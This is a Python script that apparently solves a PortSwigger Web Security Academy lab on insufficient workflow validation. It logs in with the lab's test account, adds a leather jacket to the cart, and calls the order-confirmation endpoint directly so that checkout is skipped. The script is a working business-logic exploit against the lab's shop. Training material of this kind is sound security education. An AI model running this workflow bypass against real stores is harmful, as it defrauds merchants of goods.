###########################################################
#
# Lab: Insufficient workflow validation
#
# Hack Steps: 
#      1. Fetch login page
#      2. Extract the csrf token and session cookie
#      3. Login as wiener
#      4. Add the leather jacket to the cart
#      5. Confirm order directly without checking out
#
###########################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0ab500aa039282a9813b3b8d00410069.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)
    
    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie to login.. ", end="", flush=True)
    
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    cookies = { "session": session }
    login_as_wiener = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Adding the leather jacket to the cart.. ", end="", flush=True)

    session = login_as_wiener.cookies.get("session")
    cookies = { "session": session }
    data = { "productId": "1", "redir": "PRODUCT", "quantity": "1" }
    post_data("/cart", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Confirming order directly without checking out.. ", end="", flush=True)

    fetch("/cart/order-confirmation?order-confirmed=true", cookies=cookies)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()

